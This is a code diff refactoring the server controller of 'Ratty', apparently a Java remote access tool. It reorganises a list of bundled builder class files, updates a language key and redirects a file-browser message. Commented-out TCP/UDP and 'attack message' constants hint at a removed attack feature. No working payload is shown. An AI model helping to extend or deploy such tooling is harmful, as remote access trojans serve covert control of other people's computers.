@@ -92,6 +92,7 @@ public final class RattyGuiController extends AbstractRattyController implements
 		"ping.wav",
 		"lato.ttf",
 		"icons.png",
+		
 		"language/lang_bsq.properties",
 		"language/lang_de.properties",
 		"language/lang_en.properties",
@@ -109,21 +110,29 @@ public final class RattyGuiController extends AbstractRattyController implements
 		"language/lang_ro.properties",
 		"language/lang_sr.properties",
 		"language/lang_sr_Latn.properties",
+		
 		"de/sogomn/rat/RattyServer.class",
+		
 		"de/sogomn/rat/server/AbstractRattyController.class",
 		"de/sogomn/rat/server/ActiveServer.class",
 		"de/sogomn/rat/server/IServerObserver.class",
-		"de/sogomn/rat/gui/server/IServerListGui.class",
-		"de/sogomn/rat/gui/server/IRattyGui.class",
-		"de/sogomn/rat/gui/server/IRattyGui.class",
-		"de/sogomn/rat/gui/server/IServerListGui.class",
-		"de/sogomn/rat/gui/server/IFileBrowserGui.class",
-		"de/sogomn/rat/gui/server/FileBrowserSwingGui.class",
-		"de/sogomn/rat/gui/server/IBuilderGui.class",
-		"de/sogomn/rat/gui/server/IBuilderGui.class",
-		"de/sogomn/rat/gui/server/ServerClient.class",
-		"de/sogomn/rat/gui/server/ServerClientTableModel.class",
-		"de/sogomn/rat/gui/server/RattyGuiController.class"
+		
+		"de/sogomn/rat/gui/IServerListGui.class",
+		"de/sogomn/rat/gui/IRattyGui.class",
+		"de/sogomn/rat/gui/IFileBrowserGui.class",
+		"de/sogomn/rat/gui/IBuilderGui.class",
+		"de/sogomn/rat/gui/ServerClient.class",
+		"de/sogomn/rat/gui/RattyGuiController.class",
+		
+		"de/sogomn/rat/gui/swing/BuilderSwingGui.class",
+		"de/sogomn/rat/gui/swing/DisplaySwingGui.class",
+		"de/sogomn/rat/gui/swing/FileBrowserSwingGui.class",
+		"de/sogomn/rat/gui/swing/LoggingSwingGui.class",
+		"de/sogomn/rat/gui/swing/Notification.class",
+		"de/sogomn/rat/gui/swing/RattySwingGui.class",
+		"de/sogomn/rat/gui/swing/RattySwingGuiFactory.class",
+		"de/sogomn/rat/gui/swing/ServerClientTableModel.class",
+		"de/sogomn/rat/gui/swing/ServerListSwingGui.class"
 	};
 	
 	private static final String FREE_WARNING = LANGUAGE.getString("server.free_warning");
@@ -134,7 +143,7 @@ public final class RattyGuiController extends AbstractRattyController implements
 //	private static final String OPTION_TCP = LANGUAGE.getString("server.tcp");
 //	private static final String OPTION_UDP = LANGUAGE.getString("server.udp");
 //	private static final String ATTACK_MESSAGE = LANGUAGE.getString("server.attack_message");
-	private static final String BUILDER_ERROR_MESSAGE = LANGUAGE.getString("builder.error");
+	private static final String BUILDER_ERROR_MESSAGE = LANGUAGE.getString("server.error");
 	private static final String URL_MESSAGE = LANGUAGE.getString("server.url_message");
 	private static final String AMOUNT_QUESTION = LANGUAGE.getString("server.amount_question");
 	private static final String FILE_NAME = LANGUAGE.getString("file_information.name");
@@ -903,7 +912,7 @@ public final class RattyGuiController extends AbstractRattyController implements
 				.append(FILE_LAST_MODIFICATION).append(": ").append(lastModificationDate)
 				.toString();
 		
-		gui.showMessage(message);
+		client.fileBrowser.showMessage(message);
 	}
 	
 	private void handleInfoPacket(final ComputerInfoPacket packet) {
